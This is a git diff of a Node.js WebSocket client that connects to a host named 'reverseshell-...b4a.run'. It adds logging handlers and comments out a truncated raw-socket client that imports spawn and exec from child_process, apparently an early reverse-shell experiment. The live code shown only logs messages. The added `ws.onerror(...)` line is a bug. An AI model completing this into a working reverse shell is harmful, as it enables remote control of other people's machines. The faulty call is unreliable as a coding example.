@@ -1,24 +1,32 @@
-const net = require('net');
-const { spawn, exec } = require('child_process');
-
-
 var WebSocket = require('ws');
 //var ws = new WebSocket('wss://192.168.0.240:8080');
-var ws = new WebSocket('ws://reverseshell-ondrejdostal007.b4a.run/');
+var ws = new WebSocket('wss://reverseshell-ondrejdostal007.b4a.run/');
 ws.on('open', (data) => {
     console.log(data)
     //ws.send('something');
 });
 ws.on('message', function(data, flags) {
-  console.log(data)
+  console.log(data.toString())
     // flags.binary will be set if a binary data is received
     // flags.masked will be set if the data was masked
 });
+
+ws.on("upgrade", (data) => {
+  console.log("Protocol upgraded from HTTP to WSS.", data.statusCode)
+})
+ws.on("close", (data) => {
+  console.log("Connection closed.", data)
+})
+ws.onerror((err) => {
+  console.log(err)
+})
 ws.on("error", (err) => {
   console.log(err)
 })
 
-/*const client = new net.Socket();
+/*const net = require('net');
+const { spawn, exec } = require('child_process');
+const client = new net.Socket();
 
 function connect() {
   client.connect(8080, '192.168.0.240', () => {
